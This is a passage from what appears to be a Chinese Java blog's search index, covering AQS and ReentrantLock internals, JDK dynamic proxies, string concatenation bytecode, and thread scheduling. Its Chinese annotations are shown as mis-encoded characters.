0) { // lock æ˜¯ unlock çŠ¶æ€ if (!hasQueuedPredecessors() \u0026\u0026 // çœ‹ä¸€ä¸‹é˜Ÿåˆ—ä¸­æ˜¯ä¸æ˜¯å·²æœ‰åœ¨ç­‰å¾…è·å–é”çš„çº¿ç¨‹ï¼Œè¿™å°±æ˜¯æ‰€è°“å…¬å¹³çš„ä½“ç°ï¼ŒFIFO compareAndSetState(0, acquires)) { // æ²¡æœ‰åœ¨ç­‰å¾…è·å–é”çš„çº¿ç¨‹, è·å–é”ï¼Œè¿™é‡Œ CAS å¯èƒ½ä¼šå¤±è´¥ setExclusiveOwnerThread(current); // æœ¬çº¿ç¨‹æŒæœ‰è¿™ä¸ªé” return true; } } else if (current == getExclusiveOwnerThread()) { // è¯¥çº¿ç¨‹å·²ç»æŒæœ‰äº†é” int nextc = c + acquires; // ç›´æ¥æ”¹å˜çŠ¶æ€ï¼Œè¿™å°±æ˜¯æ‰€è°“å¯é‡å…¥çš„æ„æ€,å·²ç»è·å–é”çš„çº¿ç¨‹ï¼Œå¯ä»¥å†æ¬¡è·å–è¯¥é” if (nextc \u003c 0) throw new Error(\"Maximum lock count exceeded\"); // è¿™é‡Œå¯èƒ½ä¼šæŠ›å¼‚å¸¸ setState(nextc); return true; } return false; } addWaiter åˆ†æ çº¿ç¨‹è·å–é”å¤±è´¥, åˆ°é˜»å¡é˜Ÿåˆ—å»æ’é˜Ÿã€‚è¿™é‡Œæ˜¯ addWaiter(null, 1)\n/** * Creates and enqueues node for current thread and given mode. * * @param mode Node.EXCLUSIVE for exclusive, Node.SHARED for shared * @return the new node */ private Node addWaiter(Node mode) { Node node = new Node(Thread.currentThread(), mode); // Try the fast path of enq; backup to full enq on failure Node pred = tail; if (pred != null) { // è¯´æ˜é˜Ÿåˆ—ä¸ç©º node.prev = pred; // è®¾ç½® node å‰é©± if (compareAndSetTail(pred, node)) { // AQS è®¾ç½®æ–°çš„ tail pred.next = node; // è®¾ç½® pred åç»§ return node; // è¿”å›åŒ…è£…ç”³è¯·é”çš„çº¿ç¨‹çš„ Node èŠ‚ç‚¹ } } enq(node); // è¯´æ˜é˜Ÿåˆ—ä¸ºç©º return node; // è¿”å›åŒ…è£…ç”³è¯·é”çš„çº¿ç¨‹çš„ Node èŠ‚ç‚¹ } enq è¿”å› node çš„å‰é©±èŠ‚ç‚¹ addWaiter å›¾ç¤º é“¾è¡¨ï¼Œè¿˜æ˜¯ç”»ä¸€ç”»å›¾ï¼Œç†è§£çš„æ›´å¥½\ntail == null, ç­‰å¾…é˜Ÿåˆ—é‡Œä¸€ä¸ªç­‰å¾…çš„çº¿ç¨‹ Node ä¹Ÿæ²¡æœ‰ enq å…¥é˜Ÿ, åˆ›å»ºä¸€ä¸ª Node èŠ‚ç‚¹,ä½œä¸º head, å†æ·»åŠ è¦è·å–é”çš„èŠ‚ç‚¹ tail != null, ç­‰å¾…é˜Ÿåˆ—é‡Œå·²ç»æœ‰ç­‰å¾…çš„çº¿ç¨‹ Node äº† ç›´æ¥æ·»åŠ åˆ°ç­‰å¾…é˜Ÿåˆ—é˜Ÿå°¾ acquireQueued åˆ†æ AbstractOwnableSynchronizer.java /** * Acquires in exclusive uninterruptible mode for thread already in * queue. Used by condition wait methods as well as acquire. * * @param node the node * @param arg the acquire argument * @return {@code true} if interrupted while waiting */ final boolean acquireQueued(final Node node, int arg) { boolean failed = true; try { boolean interrupted = false; for (;;) { // æ³¨æ„æ˜¯å¾ªç¯ final Node p = node.predecessor(); if (p == head \u0026\u0026 tryAcquire(arg)) { // æ˜¯ç­‰å¾…é˜Ÿåˆ—çš„ç¬¬ä¸€ä¸ª \u0026\u0026 tryAcquire , true è¡¨æ˜è·å–äº†é” setHead(node); // è®¾ç½®æˆ head, æ—§çš„ head å‡ºé˜Ÿ p.next = null; // help GC failed = false; return interrupted; } if (shouldParkAfterFailedAcquire(p, node) \u0026\u0026 // é”å·²è¢«å…¶ä»–çº¿ç¨‹è·å–, ä¼šèµ°åˆ°è¿™é‡Œ parkAndCheckInterrupt()) interrupted = true; } } finally { if (failed) cancelAcquire(node); } } acquireQueued for å¾ªç¯é€€å‡ºä¸¤ç§æƒ…å†µ å½“å‰èŠ‚ç‚¹æ˜¯ç­‰å¾…é˜Ÿåˆ—ç¬¬ä¸€ä¸ª \u0026\u0026 tryAcquire æˆåŠŸè·å–äº†é” tryAcquire æŠ›å‡ºäº† Error, finally çš„ failed é€»è¾‘ä¼šæ‰§è¡Œ cancelAcquire acquireQueued ä¸¤è½®å¾ªç¯åˆ†æ cancelAcquire åˆ†æ /** * Cancels an ongoing attempt to acquire. * * @param node the node */ private void cancelAcquire(Node node) { // Ignore if node doesn't exist if (node == null) return; node.thread = null; // å–æ¶ˆçº¿ç¨‹ // Skip cancelled predecessors è·³è¿‡å–æ¶ˆçš„èŠ‚ç‚¹ Node pred = node.prev; while (pred.waitStatus \u003e 0) node.prev = pred = pred.prev; // predNext is the apparent node to unsplice. CASes below will // fail if not, in which case, we lost race vs another cancel // or signal, so no further action is necessary. Node predNext = pred.next; // Can use unconditional write instead of CAS here. // After this atomic step, other Nodes can skip past us. // Before, we are free of interference from other threads. node.waitStatus = Node.CANCELLED; // If we are the tail, remove ourselves. é˜Ÿå°¾ if (node == tail \u0026\u0026 compareAndSetTail(node, pred)) { // expect update compareAndSetNext(pred, predNext, null); // node expect null } else { // If successor needs signal, try to set pred's next-link // so it will get one. Otherwise wake it up to propagate. // ä¸æ˜¯é˜Ÿå°¾ï¼Œä¹Ÿå°±æ˜¯ç­‰å¾…é˜Ÿåˆ—çš„å…¶ä»–èŠ‚ç‚¹ int ws; if (pred != head \u0026\u0026 // ä¸æ˜¯ç­‰å¾…é˜Ÿåˆ—ä¸­ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ ((ws = pred.waitStatus) == Node.SIGNAL || (ws \u003c= 0 \u0026\u0026 compareAndSetWaitStatus(pred, ws, Node.SIGNAL))) \u0026\u0026 pred.thread != null) { // pred.thread != null è¡¨ç¤ºå‰é©±èŠ‚ç‚¹æœ‰çº¿ç¨‹åœ¨ç­‰å¾…è·å–é” Node next = node.next; if (next != null \u0026\u0026 next.waitStatus \u003c= 0) // å–æ¶ˆèŠ‚ç‚¹æœ‰åç»§èŠ‚ç‚¹ next ä¸”åç»§èŠ‚ç‚¹ waitStatus \u003c= 0 compareAndSetNext(pred, predNext, next); // pred è®¾ç½®æ–°çš„ next èŠ‚ç‚¹ } else { // å–æ¶ˆç­‰å¾…çš„èŠ‚ç‚¹æ˜¯ç­‰å¾…é˜Ÿåˆ—ä¸­çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹, å«é†’åç»§èŠ‚ç‚¹ unparkSuccessor(node); } node.next = node; // help GC } } if ä¸º true åˆ¤æ–­åˆ†æ ä¸ºäº†å°†å–æ¶ˆèŠ‚ç‚¹çš„å‰é©±èŠ‚ç‚¹å’Œå–æ¶ˆèŠ‚ç‚¹çš„åç»§èŠ‚ç‚¹è¿›è¡Œé“¾æ¥\nif (pred != head \u0026\u0026 ((ws = pred.waitStatus) == Node.SIGNAL || (ws \u003c= 0 \u0026\u0026 compareAndSetWaitStatus(pred, ws, Node.SIGNAL))) \u0026\u0026 pred.thread != null) pred != head ä¸º true è¡¨ç¤ºå–æ¶ˆèŠ‚ç‚¹ä¸æ˜¯ç­‰å¾…é˜Ÿåˆ—ä¸­ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ ((ws = pred.waitStatus) == Node.SIGNAL || (ws \u003c= 0 \u0026\u0026 compareAndSetWaitStatus(pred, ws, Node.SIGNAL))) ä¸º true (ws = pred.waitStatus) == Node.SIGNAL ä¸º true, å‰é©±èŠ‚ç‚¹çš„ waitStatus ä¸º -1 (ws \u003c= 0 \u0026\u0026 compareAndSetWaitStatus(pred, ws, Node.SIGNAL)) ä¸º true ws \u003c= 0 ä¸º true, å‰é©±èŠ‚ç‚¹çš„ waitStatus ä¸º 0, é‚£å°± compareAndSetWaitStatus å‰é©±èŠ‚ç‚¹çš„ waitStatus ä¸º -1 compareAndSetWaitStatus è¿”å›ä¸º true, è®¾ç½®å‰é©±èŠ‚ç‚¹çš„çš„ waitStatus ä¸º -1 æˆåŠŸ pred.thread != null ä¸º true å‰é©±èŠ‚ç‚¹æœ‰ç­‰å¾…çš„çº¿ç¨‹ shouldParkAfterFailedAcquire åˆ†æ ä¸ºå³å°†è¢« block çš„çº¿ç¨‹ï¼Œè®¾ç½®å‰é©±èŠ‚ç‚¹çš„ waitStatus ä¸º -1, è¡¨ç¤ºä¸‹ä¸€ä¸ªèŠ‚ç‚¹éœ€è¦è¢«å”¤é†’\n/** * Checks and updates status for a node that failed to acquire. * Returns true if thread should block. This is the main signal * control in all acquire loops. Requires that pred == node.prev. * * @param pred node's predecessor holding status * @param node the node * @return {@code true} if thread should block */ private static boolean shouldParkAfterFailedAcquire(Node pred, Node node) { int ws = pred.waitStatus; if (ws == Node.SIGNAL) /* * This node has already set status asking a release * to signal it, so it can safely park. */ return true; if (ws \u003e 0) { // çº¿ç¨‹å–æ¶ˆäº†è·å–é”, æ‰¾åˆ°ä¸€ä¸ªæ²¡æœ‰å–æ¶ˆçš„ /* * Predecessor was cancelled. Skip over predecessors and * indicate retry. */ do { node.prev = pred = pred.prev; } while (pred.waitStatus \u003e 0); pred.next = node; } else { /* * waitStatus must be 0 or PROPAGATE. Indicate that we * need a signal, but don't park yet. Caller will need to * retry to make sure it cannot acquire before parking. */ compareAndSetWaitStatus(pred, ws, Node.SIGNAL); // è®¾ç½®å‰é©±èŠ‚ç‚¹çš„ waitStatus ä¸º -1 } return false; } parkAndCheckInterrupt åˆ†æ çº¿ç¨‹çŠ¶æ€è¿›å…¥ waiting çš„é‡è¦é€»è¾‘\nAbstractOwnableSynchronizer.java /** * Convenience method to park and then check if interrupted * * @return {@code true} if interrupted */ private final boolean parkAndCheckInterrupt() { LockSupport.park(this); // è°ƒç”¨çº¿ç¨‹æ‰§è¡Œåˆ°è¿™é‡Œå°±ä¸å†ç»§ç»­å‘ä¸‹æ‰§è¡Œäº†, è¿™æ˜¯ç†è§£çº¿ç¨‹ waiting çš„å…³é”® return Thread.interrupted(); // çº¿ç¨‹è¢«å”¤é†’åæ‰ä¼š return, æ‰§è¡Œä¸‹ä¸€è½®çš„ acquireQueued } ","fairsyncunlock-åˆ†æ#FairSync.unlock åˆ†æ":"release åˆ†æ /** * Releases in exclusive mode. Implemented by unblocking one or * more threads if {@link #tryRelease} returns true. * This method can be used to implement method {@link Lock#unlock}. * * @param arg the release argument. This value is conveyed to * {@link #tryRelease} but is otherwise uninterpreted and * can represent anything you like. * @return the value returned from {@link #tryRelease} */ public final boolean release(int arg) { if (tryRelease(arg)) { // é‡Šæ”¾é” Node h = head; if (h != null \u0026\u0026 h.waitStatus != 0) // waitStatus ä¸º -1, è¡¨æ˜ä¸‹ä¸€ä¸ªèŠ‚ç‚¹éœ€è¦è¢«å”¤é†’ unparkSuccessor(h); // å”¤é†’ head èŠ‚ç‚¹åçš„èŠ‚ç‚¹ï¼Œä¹Ÿå°±æ˜¯ç­‰å¾…é˜Ÿåˆ—ä¸­ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ return true; } return false; } tryRelease åˆ†æ è¯¥æ–¹æ³•å¯èƒ½æŠ›å‡ºå¼‚å¸¸ AbstractOwnableSynchronizer.java protected final boolean tryRelease(int releases) { int c = getState() - releases; if (Thread.currentThread() != getExclusiveOwnerThread()) // æ˜¯ä¸æ˜¯æŒæœ‰è¯¥é”çš„çº¿ç¨‹åœ¨ release throw new IllegalMonitorStateException(); boolean free = false; if (c == 0) { // å·²å®Œå…¨é‡Šæ”¾ï¼Œå› ä¸ºå¯ä»¥é‡å…¥ free = true; setExclusiveOwnerThread(null); } setState(c); // lock è®¾ç½®æˆ unlock çŠ¶æ€ï¼Œä¹Ÿå°±æ˜¯ 0ï¼Œè¿™å°±æ˜¯æ‰€è°“çš„é‡Šæ”¾é” return free; } unparkSuccessor åˆ†æ AbstractOwnableSynchronizer.java /** * Wakes up node's successor, if one exists. * * @param node the node */ private void unparkSuccessor(Node node) { /* * If status is negative (i.e., possibly needing signal) try * to clear in anticipation of signalling. It is OK if this * fails or if status is changed by waiting thread. */ int ws = node.waitStatus; if (ws \u003c 0) compareAndSetWaitStatus(node, ws, 0); /* * Thread to unpark is held in successor, which is normally * just the next node. But if cancelled or apparently null, * traverse backwards from tail to find the actual * non-cancelled successor. */ Node s = node.next; if (s == null || s.waitStatus \u003e 0) { s = null; for (Node t = tail; t != null \u0026\u0026 t != node; t = t.prev) if (t.waitStatus \u003c= 0) s = t; } if (s != null) LockSupport.unpark(s.thread); // å”¤é†’è¿™ä¸ªçº¿ç¨‹ } ","node-æ•°æ®ç»“æ„#Node æ•°æ®ç»“æ„":" ç»„æˆåŒå‘é“¾è¡¨ï¼Œåœ¨ä¹‹ä¸Šæ„å»ºç­‰å¾…é˜Ÿåˆ—\nvolatile int waitStatus; // ä¸‹ä¸€ä¸ª Node ç­‰å¾…çŠ¶æ€ volatile Node prev; // å‰é©±èŠ‚ç‚¹ volatile Node next; // åç»§èŠ‚ç‚¹ volatile Thread thread; // å…¥é˜Ÿç­‰å¾…çš„çº¿ç¨‹ ","references#References":" https://javadoop.com/post/AbstractQueuedSynchronizer å¼ºçƒˆæ¨è ","rentrantlocklock-æ•´ä½“æ¦‚è§ˆ#RentrantLock.lock æ•´ä½“æ¦‚è§ˆ":"RentrantLock.lock æµç¨‹æ¦‚è§ˆ"},"title":"Java Aqs"},"/blog/java-jdk-proxy/":{"data":{"dynamic-proxy-æ˜¯å•¥#dynamic proxy æ˜¯å•¥ï¼Ÿ":"","invocationhandler-æ¥å£å®ç°ç±»-dynastydynamicproxy-åˆ†æ#\u003ccode\u003eInvocationHandler\u003c/code\u003e æ¥å£å®ç°ç±» \u003ccode\u003eDynastyDynamicProxy\u003c/code\u003e åˆ†æ":"","proxygeneratorjava#ProxyGenerator.java":"","references#References":" dynamic-proxy-class-method jdk-com-sun-proxy ProxyGenerator#sun.misc.ProxyGenerator.saveGeneratedFiles jdk8-proxy åˆ†ææ‰€ç”¨ä»£ç  $Proxy0 jdk-porxy-and-cglib ","ä¿å­˜è¿è¡Œæ—¶ç”Ÿæˆçš„åŠ¨æ€ä»£ç†ç±»#ä¿å­˜è¿è¡Œæ—¶ç”Ÿæˆçš„åŠ¨æ€ä»£ç†ç±»":"","è¢«ä»£ç†çš„ç±»-tangdynasty-åˆ†æ#è¢«ä»£ç†çš„ç±» \u003ccode\u003eTangDynasty\u003c/code\u003e åˆ†æ":" åˆ†æç¯å¢ƒ: jdk8\ndynamic proxy æ˜¯å•¥ï¼Ÿ A dynamic proxy class is a class that implements a list of interfaces1 specified at runtime such that a method invocation through one of the interfaces on an instance of the class will be encoded and dispatched to another object through a uniform interface2.\nåŠ¨æ€ä»£ç†ç±»ç”Ÿæˆè°ƒç”¨æ–¹æ³•å¦‚ä¸‹ï¼š Proxy.newProxyInstance(handler.getClass().getClassLoader(), new Class[]{Dynasty.class},handler); handler.getClass().getClassLoader() è¿è¡Œæ—¶åŠ¨æ€ç”Ÿæˆçš„ä»£ç†ç±» load åˆ° jvm ä½¿ç”¨çš„ class loaderã€‚ new Class[]{Dynasty.class} è¿è¡Œæ—¶åŠ¨æ€ç”Ÿæˆçš„ä»£ç†ç±»å®ç°çš„ä¸€ç³»åˆ—æ¥å£ã€‚ handler Invocation Handler é€šè¿‡ invoke() æ¥åˆ†å‘æ–¹æ³•ï¼ŒåŒ…å«è¢«å®é™…ä»£ç†çš„å¯¹è±¡å®ä¾‹ã€‚ ä¿å­˜è¿è¡Œæ—¶ç”Ÿæˆçš„åŠ¨æ€ä»£ç†ç±»ProxyGenerator.java /** debugging flag for saving generated class files */ private final static boolean saveGeneratedFiles = java.security.AccessController.doPrivileged( new GetBooleanAction( \"sun.misc.ProxyGenerator.saveGeneratedFiles\")).booleanValue(); è®¾ç½® sun.misc.ProxyGenerator.saveGeneratedFiles System.setProperty(\"sun.misc.ProxyGenerator.saveGeneratedFiles\", \"true\"); è¿è¡Œæ—¶ç”Ÿæˆçš„åŠ¨æ€ä»£ç†ç±»($Proxy0)åˆ†æè¿è¡Œæ—¶ç”Ÿæˆçš„åŠ¨æ€ä»£ç†ç±»å®ä¾‹åŒ– $Proxy0 -\u003e Proxy(InvocationHandler h) ç”±æ­¤å¯è§:\nåŠ¨æ€ä»£ç†ç±» $Proxy0 å®ä¾‹åŒ–æ—¶ï¼Œè°ƒç”¨ super class Proxy çš„æ„é€ å‡½æ•°ï¼Œéœ€è¦çš„ InvocationHandler æ˜¯å®ç°äº†è¯¥æ¥å£çš„ DynastyDynamicProxy DynastyDynamicProxy å®ä¾‹åŒ–æ—¶ï¼Œæ„é€ å‡½æ•°éœ€è¦çš„æ˜¯ TangDynasty è¿™ä¸ªå®é™…è¢«ä»£ç†çš„ç±»ã€‚ è¿è¡Œæ—¶ç”Ÿæˆçš„åŠ¨æ€ä»£ç†ç±»æ–¹æ³• $Proxy0 çš„å‘½å // prefix for all proxy class names private static final String proxyClassNamePrefix = \"$Proxy\"; // next number to use for generation of unique proxy class names private static final AtomicLong nextUniqueNumber = new AtomicLong(); $Proxy0#founder public final String founder() throws { try { return (String)super.h.invoke(this, m4, (Object[])null); // super.h.invoke æŒ‡çš„å°±æ˜¯ DynastyDynamicProxy.invoke } catch (RuntimeException | Error var2) { throw var2; } catch (Throwable var3) { throw new UndeclaredThrowableException(var3); } } $Proxy0#reviver public final String reviver() throws { try { return (String)super.h.invoke(this, m5, (Object[])null); // super.h.invoke æŒ‡çš„å°±æ˜¯ DynastyDynamicProxy.invoke } catch (RuntimeException | Error var2) { throw var2; } catch (Throwable var3) { throw new UndeclaredThrowableException(var3); } } $Proxy0#lastEmperor public final String lastEmperor() throws { try { return (String)super.h.invoke(this, m3, (Object[])null); // super.h.invoke æŒ‡çš„å°±æ˜¯ DynastyDynamicProxy.invoke } catch (RuntimeException | Error var2) { throw var2; } catch (Throwable var3) { throw new UndeclaredThrowableException(var3); } } ç”±ä¸Šå¯çŸ¥ï¼Œ$Proxy0 å®ç°çš„æ–¹æ³•çš„ç»Ÿä¸€è°ƒç”¨å…¥å£(uniform interface) å°±æ˜¯ DynastyDynamicProxy#invokeï¼Œä¹Ÿå°±æ˜¯ jdk åŠ¨æ€ä»£ç†å¿…é¡»å®ç°çš„ InvocationHandler#invoke æ–¹æ³•ã€‚\nInvocationHandler æ¥å£å®ç°ç±» DynastyDynamicProxy åˆ†æ public class DynastyDynamicProxy implements InvocationHandler { // è¢«ä»£ç†çš„å¯¹è±¡ private Object delegate; public DynastyDynamicProxy(Object originalDynamic){ this.delegate = originalDynamic; } /** @param proxy å½“å‰åŠ¨æ€ä»£ç†ç±» $Proxy0 çš„å®ä¾‹ @param method å½“å‰åŠ¨æ€ä»£ç†ç±»è°ƒç”¨çš„æ–¹æ³• @param args å½“å‰åŠ¨æ€ä»£ç†ç±»è°ƒç”¨çš„æ–¹æ³•çš„å‚æ•° **/ @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(\"å…¬å…ƒ 618 å¹´å”æœå»ºç«‹!\"); String res = (String) method.invoke(delegate,args); System.out.println(method.getName() + \" of Tang Dynasty was \" + res + \"!\"); System.out.println(\"å…¬å…ƒ 907 å¹´å”æœç­äº¡!\\n\"); return res; } } è¢«ä»£ç†çš„ç±» TangDynasty åˆ†æ\npublic class TangDynasty implements Dynasty{ @Override public String founder() { return \"ææ¸Š\"; } @Override public String reviver() { return \"æéš†åŸº\"; } @Override public String lastEmperor() { return \"ææŸ·\"; } } ç”±è°ƒç”¨æ ˆå¯çŸ¥ï¼Œæœ€ç»ˆè¿˜æ˜¯è¦è°ƒç”¨è¢«ä»£ç†çš„ç±»çš„æ–¹æ³•ã€‚ ä½†æ˜¯å¯ä»¥åœ¨æ‰§è¡ŒçœŸæ­£çš„ä»£ç†ç±»æ–¹æ³•ä¹‹å‰ï¼Œåœ¨ InvocationHandler#invoke ä¸­æ·»åŠ å®é™…éœ€è¦çš„é€»è¾‘ã€‚è¿™å°±æ˜¯ä¸­é—´å±‚ï¼Œé€šè¿‡ä¸­é—´å±‚è¿›è¡Œé€»è¾‘çš„å¢å¼ºã€‚ è¿™æ ·çœ‹èµ·æ¥å°±å¥½åƒè¢«ä»£ç†å¯¹è±¡çš„é€»è¾‘è¿›è¡Œäº†å¢å¼ºã€‚ ","è®¾ç½®-sunmiscproxygeneratorsavegeneratedfiles#è®¾ç½® \u003ccode\u003esun.misc.ProxyGenerator.saveGeneratedFiles\u003c/code\u003e":"","è¿è¡Œæ—¶ç”Ÿæˆçš„åŠ¨æ€ä»£ç†ç±»proxy0åˆ†æ#è¿è¡Œæ—¶ç”Ÿæˆçš„åŠ¨æ€ä»£ç†ç±»($Proxy0)åˆ†æ":"","è¿è¡Œæ—¶ç”Ÿæˆçš„åŠ¨æ€ä»£ç†ç±»å®ä¾‹åŒ–#è¿è¡Œæ—¶ç”Ÿæˆçš„åŠ¨æ€ä»£ç†ç±»å®ä¾‹åŒ–":"","è¿è¡Œæ—¶ç”Ÿæˆçš„åŠ¨æ€ä»£ç†ç±»æ–¹æ³•#è¿è¡Œæ—¶ç”Ÿæˆçš„åŠ¨æ€ä»£ç†ç±»æ–¹æ³•":""},"title":"Java Jdk Proxy"},"/blog/java-keyword-volatile/":{"data":{"":"","references#References":" von-neumann-harvard-architecture out-of-order-execution(dynamic execution) Instruction_scheduling X86/GCC memory fenceçš„ä¸€äº›è§è§£ ","å¯è§æ€§é—®é¢˜#å¯è§æ€§é—®é¢˜":"","å¯è§æ€§é—®é¢˜æ€è·¯#å¯è§æ€§é—®é¢˜æ€è·¯":""},"title":"java-keyword-volatile"},"/blog/java-string-concat-in-loop/":{"data":{"main-å­—èŠ‚ç #main å­—èŠ‚ç ":" public static void main(java.lang.String[]); Code: 0: ldc #2 // String $ 2: astore_1 3: iconst_0 4: istore_2 5: iload_2 6: bipush 10 8: if_icmpge 36 11: new #3 // class java/lang/StringBuilder 14: dup 15: invokespecial #4 // Method java/lang/StringBuilder.\"\u003cinit\u003e\":()V 18: aload_1 19: invokevirtual #5 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 22: iload_2 23: invokevirtual #6 // Method java/lang/StringBuilder.append:(I)Ljava/lang/StringBuilder; 26: invokevirtual #7 // Method java/lang/StringBuilder.toString:()Ljava/lang/String; 29: astore_1 30: iinc 2, 1 33: goto 5 36: getstatic #8 // Field java/lang/System.out:Ljava/io/PrintStream; 39: aload_1 40: invokevirtual #9 // Method java/io/PrintStream.println:(Ljava/lang/String;)V 43: return ","main-å­—èŠ‚ç æ‰§è¡Œå›¾è§£åˆ†æ#main å­—èŠ‚ç æ‰§è¡Œå›¾è§£åˆ†æ":"\nç”±å›¾å¯ä»¥çœ‹å‡ºï¼Œåœ¨å¤–éƒ¨å®šä¹‰çš„å­—ç¬¦ä¸²å˜é‡ sï¼Œåœ¨ for å¾ªç¯ä¸­å’Œå…¶ä»–å˜é‡è¿›è¡Œæ‹¼æ¥ï¼Œæœ€ç»ˆå¾—åˆ°è¿æ¥åçš„ sã€‚\nå¾ªç¯çš„æ¯ä¸€è½®éƒ½ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„ StringBuilder å¯¹è±¡ï¼Œè¿›è¡Œä¸¤æ¬¡ append æ“ä½œï¼Œappend(s) å’Œ append(i)ã€‚æœ€ç»ˆè¿™ä¸€è½®çš„ s æ˜¯ç”± sb.toString() å¾—æ¥çš„ã€‚\nå¦‚æœå¾ªç¯æ¬¡æ•°æ˜¯ 1ä¸‡æ¬¡ï¼Œéœ€è¦åˆ›å»ºçš„ StringBuilder æ˜¯ 1 ä¸‡ä¸ªã€‚è¿™æ ·æ˜¯å¯¹æ€§èƒ½è‚¯å®šæœ‰å½±å“çš„ã€‚çŸ­æ—¶é—´å†…äº§ç”Ÿå¤§é‡çš„å¯¹è±¡ã€‚","references#References":" https://docs.oracle.com/javase/specs/jvms/se19/html/jvms-6.html#jvms-6.5.ldc https://docs.oracle.com/javase/specs/jvms/se19/html/jvms-6.html#jvms-6.5.astore_n https://docs.oracle.com/javase/specs/jvms/se19/html/jvms-6.html#jvms-6.5.iload_n https://docs.oracle.com/javase/specs/jvms/se19/html/jvms-6.html#jvms-6.5.bipush https://docs.oracle.com/javase/specs/jvms/se19/html/jvms-6.html#jvms-6.5.if_icmp_cond https://docs.oracle.com/javase/specs/jvms/se19/html/jvms-6.html#jvms-6.5.new https://docs.oracle.com/javase/specs/jvms/se19/html/jvms-6.html#jvms-6.5.iinc https://docs.oracle.com/javase/specs/jvms/se19/html/jvms-6.html#jvms-6.5.getstatic https://docs.oracle.com/javase/specs/jvms/se19/html/jvms-6.html#jvms-6.5.invokevirtual ","åˆ†æä»£ç #åˆ†æä»£ç ":" public class StringConcat { public static void main(String[] args) { String s = \"$\"; for (int i = 0; i \u003c 10; i++) { s += i; } System.out.println(s); } } ","åˆ†æç¯å¢ƒ#åˆ†æç¯å¢ƒ":"åˆ†æç¯å¢ƒ jdk8","ç»“è®º#ç»“è®º":" å¾ªç¯æ¬¡æ•°è¿‡å¤šæ—¶ï¼Œä¸è¦åœ¨å¾ªç¯é‡Œæ‹¼æ¥éœ€è¦çš„å­—ç¬¦ä¸²ã€‚"},"title":"Java String Concat in Loop"},"/blog/java-thread-pool-params/":{"data":{"":"","references#References":" ä½ ç®¡è¿™ç ´ç©æ„å«çº¿ç¨‹æ±  ","å›¾è§£#å›¾è§£":"","åŸºæœ¬ç­–ç•¥#åŸºæœ¬ç­–ç•¥":" å…³æ³¨ç‚¹åˆ†ç¦»ï¼Œä»»åŠ¡æäº¤å’Œæ‰§è¡Œåˆ†ç¦»ã€‚ å»¶è¿Ÿç­–ç•¥ï¼Œå»¶è¿Ÿåˆå§‹åŒ–ã€‚ "},"title":"Java Thread Pool Params"},"/blog/java-thread/":{"data":{"":"","aqs-å’Œ-os-å…³ç³»#AQS å’Œ OS å…³ç³»":"","java-çš„çº¿ç¨‹ç”±-os-scheduler-è´Ÿè´£è°ƒåº¦#java çš„çº¿ç¨‹ç”± os scheduler è´Ÿè´£è°ƒåº¦":"","synchronized-å…³é”®å­—å’Œ-os-å…³ç³»#synchronized å…³é”®å­—å’Œ OS å…³ç³»":"","synchronized-ç”¨æˆ·ç©ºé—´ä¼˜åŒ–æ€è·¯#\u003ccode\u003esynchronized\u003c/code\u003e ç”¨æˆ·ç©ºé—´ä¼˜åŒ–æ€è·¯":"java çš„çº¿ç¨‹ç”± os scheduler è´Ÿè´£è°ƒåº¦ Java thread scheduling is primarily managed by the operating system (OS) scheduler, but the Java Virtual Machine (JVM) and the application code can influence thread behavior in several ways.\njava å½’æ ¹ç»“åº•ä¸€ä¸ªç”¨æˆ·ç©ºé—´çš„ç¨‹åºè€Œå·²ã€‚ å®é™…çš„çº¿ç¨‹è°ƒåº¦æ ¹æœ¬ä¸Šè¿˜æ˜¯ç”±æ“ä½œç³»ç»Ÿçš„è°ƒåº¦å™¨è´Ÿè´£ã€‚ java åªæ˜¯å¯ä»¥è°ƒæ•´ç›¸åº”å‚æ•°æ¥å½±å“çº¿ç¨‹çš„è°ƒåº¦ã€‚ çº¿ç¨‹æœ€ç»ˆå¦‚ä½•è°ƒåº¦ java æ— æ³•å†³å®šã€‚ OS Scheduler Dependency Native Threads: Modern JVMs use native threads (one-to-one mapping with OS threads). The OS scheduler is responsible for allocating CPU time to these threads based on its own algorithms (e.g., time-sharing, priority-based scheduling). Thread Lifecycle: The OS handles thread creation, scheduling, preemption, and termination. Even though Java provides abstractions like Thread and Runnable, the underlying OS controls execution. java å¯ä»¥å½±å“ Thread è¡Œä¸º While the OS scheduler has ultimate authority, Java applications can influence thread behavior through:\nThread Priority è®¾ç½®çº¿ç¨‹çš„ä¼˜å…ˆçº§\nJava allows setting thread priorities (Thread.setPriority(int priority)), which are mapped to OS-specific priorities. Effect: Higher-priority threads may get more CPU time, but this is not guaranteed. OS policies (e.g., Linuxâ€™s Completely Fair Scheduler) may ignore or reinterpret Java priorities. Example: A thread with Thread.MAX_PRIORITY might run more frequently than one with Thread.MIN_PRIORITY, but the OS decides. Thread Yielding and Sleeping æ”¾å¼ƒ CPU çš„æ§åˆ¶æƒ/ä¼‘çœ \nThread.yield(): Hints to the OS scheduler that the current thread is willing to yield its CPU time. The scheduler may choose another thread of the same priority to run. Thread.sleep(long millis): Pauses the thread for a specified time, allowing other threads to execute. This indirectly affects scheduling by reducing contention. Synchronization and Blocking Synchronized blocks, locks (synchronized, ReentrantLock), and I/O operations (e.g., file/network I/O) can cause threads to block, triggering context switches managed by the OS. Contention for shared resources (e.g., locks) can lead to thread starvation or deadlocks, which the application must manage. Thread States and Lifecycle Application code controls thread states (e.g., start(), join(), interrupt()). For example: start(): start the thread join(): Causes one thread to wait for anotherâ€™s completion. interrupt(): Signals a thread to stop, which the application must handle (e.g., via InterruptedException). Executor Framework and Thread Pools High-level concurrency utilities (java.util.concurrent) abstract thread management. Applications can configure thread pools (e.g., ThreadPoolExecutor) to control how tasks are scheduled, but the actual execution still depends on the OS scheduler. java å±‚é¢å¯ä»¥å½±å“ os è°ƒåº¦å™¨çš„å‚æ•°æ€»ç»“ Aspect Controlled By Influenced By java Scheduling Algorithm OS (e.g., Linux CFS, Windows UMS) âŒ Thread Priority OS (mapped from Java priorities) âœ… (setPriority()) Yielding/Sleeping OS (honors hints) âœ… (yield(), sleep()) Blocking/Synchronization OS (context switches) âœ… (synchronized, I/O operations) Thread Creation/Lifecycle OS (via JVM) âœ… (start(), join(), interrupt()) In short, the OS 